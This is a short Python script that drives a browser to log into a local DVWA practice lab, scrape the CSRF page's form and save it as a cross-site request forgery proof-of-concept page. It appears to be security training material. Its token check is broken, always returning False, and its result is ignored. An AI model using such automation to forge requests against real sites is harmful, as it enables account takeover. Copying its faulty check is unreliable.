import os
import rpa as r
from bs4 import BeautifulSoup

creds = ["admin", "newpassword"]
creds[1] += "[enter]" # have RPA press enter after typing credentials
loginPage = 'http://localhost/DVWA/login.php'

def login(loginPage, creds):
	r.url(loginPage)
	r.type('//*[@name="username"]', creds[0])
	r.type('//*[@name="password"]', creds[1])

def check(form):
	# Checks if form requires a token or some type of hidden field to be submitted
	if 'token' or 'type="hidden"' in str(form):
		return False
	else:
		return True

def create_poc():
	f = open("poc.html", "w")
	f.write(str(form))
	pwd = os.path.dirname(os.path.realpath(__file__))
	output = pwd + "/poc.html"
	print("Exported PoC to " + output)

	r.clipboard("file://"+output)
	r.keyboard("[ctrl][t]")
	r.keyboard("[ctrl][v]")
	# r.keyboard("[enter]")

r.init(visual_automation = True)
login(loginPage, creds)

if r.click('CSRF'):
	html = r.dom('return document.querySelector("html").outerHTML')
	soup = BeautifulSoup(html, 'html.parser')
	form = soup.find("form")
	form['action'] = r.url()+form['action']

elif r.click('bruh'):
	pass

check(form)
create_poc()

# Cleanup
r.wait(60)
r.close()